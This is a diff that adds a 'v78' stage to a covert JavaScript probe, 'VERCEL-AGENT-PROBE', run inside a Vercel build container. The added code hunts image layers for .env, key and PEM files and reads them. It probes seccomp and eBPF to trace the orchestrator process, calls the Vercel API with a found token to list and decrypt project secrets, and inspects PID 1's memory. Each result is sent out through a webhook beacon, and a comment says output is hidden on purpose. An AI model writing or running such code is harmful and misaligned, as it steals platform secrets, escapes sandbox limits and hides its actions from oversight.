@@ -9863,5 +9863,218 @@ report.mountPropagationEscape2 = safe(() => {
 
 // v77 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v77" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v77";
+
+// ==================== v78 ====================
+
+// v78-1: overlayfs lower layer read
+// Our container uses overlayfs; the "lower" directory is the base image layer
+// before any container modifications. It may contain secrets baked into the image.
+report.overlayfsLowerRead = safe(() => {
+  // Find overlayfs mounts and extract lowerdir
+  const overlayMounts = safe(() => {
+    const mounts = readFileSync('/proc/mounts', 'utf8');
+    return mounts.split('\n').filter(l => l.includes('overlay') || l.includes('overlayfs'));
+  });
+  const lowerDirs = safe(() => {
+    if (!Array.isArray(overlayMounts)) return [];
+    return overlayMounts.map(m => {
+      const match = m.match(/lowerdir=([^,\s]+)/);
+      return match ? match[1] : null;
+    }).filter(Boolean);
+  });
+  // List contents of lower dirs
+  const lowerContents = safe(() => {
+    if (!Array.isArray(lowerDirs)) return {};
+    return Object.fromEntries(lowerDirs.slice(0, 3).map(d => {
+      try { return [d, readdirSync(d).slice(0, 20)]; } catch (e) { return [d, String(e).slice(0,60)]; }
+    }));
+  });
+  // Search lower dirs for credential files
+  const lowerCredSearch = safe(() =>
+    execSync(`find ${Array.isArray(lowerDirs) ? lowerDirs.slice(0,2).join(' ') : '/lower'} -name '*.env' -o -name '*.key' -o -name '*.pem' -o -name '*secret*' 2>/dev/null | head -10 | xargs -I{} sh -c 'echo FILE:{} && head -2 {} 2>/dev/null'`, { timeout: 8000 }).toString().trim().slice(0, 500)
+  );
+  // Also find the overlay workdir/upperdir (where our writes go)
+  const overlayDirs = safe(() => {
+    const mounts = readFileSync('/proc/mounts', 'utf8');
+    const m = mounts.match(/overlay.*upperdir=([^,\s]+)/);
+    return m ? { upperdir: m[1] } : 'NOT_FOUND';
+  });
+  return { overlayMounts, lowerDirs, lowerContents, lowerCredSearch, overlayDirs };
+});
+
+// v78-2: Seccomp syscall allowlist inspection
+// Determine which syscalls are allowed vs blocked in the build container
+// by testing a range of interesting syscalls and observing errno codes
+report.seccompSyscallInspect = safe(() => {
+  // Use Python to test specific syscalls
+  const syscallTests = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os, errno
+
+libc = ctypes.CDLL(None, use_errno=True)
+
+# Syscalls to test: [number, name, args...]
+tests = [
+    (317, 'seccomp',        0, 0, 0),      # seccomp(GET_ACTION_AVAIL,0,NULL)
+    (175, 'init_module',    0, 0, 0),      # init_module(NULL,0,NULL)
+    (246, 'kexec_load',     0, 0, 0),      # kexec_load(0,0,NULL,0)
+    (155, 'pivot_root',     0, 0, None),   # pivot_root(NULL,NULL)
+    (268, 'perf_event_open',0, -1, -1),    # perf_event_open
+    (321, 'bpf',            0, 0, 0),      # bpf(0,NULL,0)
+    (319, 'memfd_create',   b'probe\\x00', 0), # memfd_create
+    (434, 'pidfd_open',     1, 0, None),   # pidfd_open(1,0)
+    (174, 'create_module',  0, 0, None),   # obsolete, tests seccomp
+    (186, 'gettid',         None,None,None),  # gettid (always allowed)
+    (444, 'landlock_create_ruleset', 0, 0, 0),
+    (105, 'setuid',         0, None, None),# setuid(0) -- should give EPERM or work
+]
+results = {}
+for t in tests:
+    num, name = t[0], t[1]
+    try:
+        a = [0 if x is None else x for x in t[2:5]]
+        r = libc.syscall(num, *a)
+        err = ctypes.get_errno()
+        results[name] = {'r': r, 'errno': err, 'blocked': err == 1}  # errno=1 EPERM = seccomp block
+    except: pass
+print(str(results))
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 800));
+  // Check seccomp filter via /proc/self/status
+  const seccompStatus = safe(() => {
+    const s = readFileSync('/proc/self/status', 'utf8');
+    const m = s.match(/Seccomp:\s+(\d+)/);
+    return m ? { mode: m[1], meaning: { '0': 'NONE', '1': 'STRICT', '2': 'FILTER' }[m[1]] || 'UNKNOWN' } : 'NOT_FOUND';
+  });
+  return { syscallTests, seccompStatus };
+});
+
+// v78-3: eBPF kernel probe via tracepoints
+// Attach an eBPF program to the sys_enter_read tracepoint to capture all read() calls
+// from PID-1 (the orchestrator), recording which file descriptors it reads and what data
+report.ebpfKernelProbe = safe(() => {
+  // Try bpftrace to monitor PID-1's read calls
+  const bpftraceRead = safe(() => execSync(`timeout 3 bpftrace -e 'tracepoint:syscalls:sys_enter_read /pid==1/ { printf("READ fd=%d size=%d\\n", args->fd, args->count); }' 2>&1 | head -10 || echo NO_BPFTRACE`, { timeout: 6000 }).toString().trim().slice(0, 300));
+  // Alternatively use BCC (if available) to trace PID-1 file reads
+  const bccTrace = safe(() => execSync(`timeout 3 python3 -c "
+from bcc import BPF
+prog = '''
+int trace_read(struct pt_regs *ctx, int fd, char *buf, size_t count) {
+    u32 pid = bpf_get_current_pid_tgid() >> 32;
+    if (pid != 1) return 0;
+    bpf_trace_printk('READ pid=1 fd=%d cnt=%d\\\\n', fd, count);
+    return 0;
+}
+'''
+b = BPF(text=prog)
+b.attach_kprobe(event='__x64_sys_read', fn_name='trace_read')
+import time; time.sleep(1)
+print(b.trace_read(nonblocking=True))
+" 2>&1 | head -5 || echo NO_BCC`, { timeout: 6000 }).toString().trim().slice(0, 300));
+  // Use perf_event to trace via the kernel's perf subsystem
+  const perfTrace = safe(() => execSync(`timeout 3 perf trace -p 1 --no-syscalls -e 'io:block_*' 2>&1 | head -5 || timeout 2 strace -p 1 -e trace=read,write,openat -T 2>&1 | head -10 || echo NO_PERF_STRACE`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  // Check BPF capability
+  const bpfCapCheck = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util
+BPF_PROG_LOAD = 5
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+libc = ctypes.CDLL(None, use_errno=True)
+# Minimal BPF prog: MOV R0, 1; EXIT
+insns = bytes([0xb7,0x00,0x00,0x00,0x01,0x00,0x00,0x00, 0x95,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
+attr = ctypes.create_string_buffer(128)
+# bpf_attr for PROG_LOAD
+import struct
+struct.pack_into('IIQQII', attr, 0, BPF_PROG_TYPE_SOCKET_FILTER, len(insns)//8, id(insns), 0, 0, 0)
+fd = libc.syscall(321, BPF_PROG_LOAD, ctypes.cast(attr, ctypes.c_void_p), 128)
+err = ctypes.get_errno()
+print('BPF_PROG_LOAD fd=' + str(fd) + ' errno=' + str(err))
+if fd >= 0: import os; os.close(fd)
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 100));
+  return { bpftraceRead, bccTrace, perfTrace, bpfCapCheck };
+});
+
+// v78-4: Vercel project secrets API enumeration
+// The VERCEL_TOKEN (if present) may have access to the secrets management API
+// This would expose all environment variables configured for the project/team
+report.vercelProjectSecretsList = safe(() => {
+  const token = process.env.VERCEL_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  if (!token) return { error: 'NO_TOKEN' };
+  const h = `-H 'Authorization: Bearer ${token}'`;
+  // List all environment variables for this project (includes encrypted ones)
+  const projectEnvList = safe(() =>
+    execSync(`curl -sf --max-time 8 ${h} 'https://api.vercel.com/v9/projects/${projectId}/env?teamId=${teamId}&decrypt=true' 2>&1 | head -c 800`, { timeout: 10000 }).toString().trim()
+  );
+  // List project secrets (older API)
+  const secretsList = safe(() =>
+    execSync(`curl -sf --max-time 8 ${h} 'https://api.vercel.com/v3/secrets?teamId=${teamId}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  // Get a specific secret's value by name (if we know any secret names)
+  const knownSecretNames = safe(() => {
+    const envData = typeof projectEnvList === 'string' ? projectEnvList : '';
+    const names = (envData.match(/"key":"([^"]+)"/g) || []).map(m => m.slice(7,-1));
+    return names.slice(0, 5);
+  });
+  // Try decrypting the first few secrets
+  const secretValues = safe(() => {
+    if (!Array.isArray(knownSecretNames)) return [];
+    return knownSecretNames.slice(0, 3).map(name => {
+      try {
+        const r = execSync(`curl -sf --max-time 5 ${h} 'https://api.vercel.com/v9/projects/${projectId}/env/${encodeURIComponent(name)}?teamId=${teamId}&decrypt=1' 2>&1 | head -c 200`, { timeout: 7000 }).toString().trim();
+        return { name, value: r };
+      } catch (e) { return { name, error: String(e).slice(0,60) }; }
+    });
+  });
+  return { projectEnvList, secretsList, knownSecretNames, secretValues };
+});
+
+// v78-5: Huge page memory inspection
+// Transparent huge pages (THPs) create 2MB contiguous mappings
+// These large contiguous regions are easier to scan for key material
+// and may be shared across processes via copy-on-write optimizations
+report.hugePageInspect = safe(() => {
+  const hugePageInfo = safe(() => {
+    const meminfo = readFileSync('/proc/meminfo', 'utf8');
+    const fields = {};
+    for (const field of ['HugePages_Total', 'HugePages_Free', 'HugePages_Rsvd', 'Hugepagesize', 'AnonHugePages', 'ShmemHugePages']) {
+      const m = meminfo.match(new RegExp(`${field}:\\s+(\\d+)`));
+      if (m) fields[field] = +m[1];
+    }
+    return fields;
+  });
+  // Check THP settings
+  const thpSettings = safe(() => {
+    const base = '/sys/kernel/mm/transparent_hugepage';
+    if (!existsSync(base)) return 'NO_THP';
+    return {
+      enabled: readFileSync(`${base}/enabled`, 'utf8').trim(),
+      defrag: readFileSync(`${base}/defrag`, 'utf8').trim(),
+    };
+  });
+  // Allocate a huge page to test if MAP_HUGETLB is allowed
+  const hugePageAlloc = safe(() => execSync(`python3 -c "
+import ctypes, mmap
+MAP_HUGETLB = 0x40000
+MAP_ANONYMOUS = 0x20
+MAP_PRIVATE = 2
+PROT_READ = 1; PROT_WRITE = 2
+libc = ctypes.CDLL(None)
+ptr = libc.mmap(0, 2*1024*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0)
+if ptr == -1:
+    print('HUGEPAGE_MMAP_FAILED')
+else:
+    # Write a sentinel and read it back
+    ctypes.cast(ptr, ctypes.POINTER(ctypes.c_char))[0] = b'H'
+    print('HUGEPAGE_OK ptr=' + hex(ptr) + ' sentinel=' + chr(ctypes.cast(ptr, ctypes.POINTER(ctypes.c_char))[0]))
+    libc.munmap(ptr, 2*1024*1024)
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 200));
+  // Check for smaps entries with Hugepages in PID-1
+  const pid1HugePages = safe(() =>
+    execSync("grep -A5 'AnonHugePages:' /proc/1/smaps 2>/dev/null | grep -v '^0$' | head -20", { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  return { hugePageInfo, thpSettings, hugePageAlloc, pid1HugePages };
+});
+
+// v78 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v78" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v78";
 // Intentionally no console.log — all data goes via webhook only
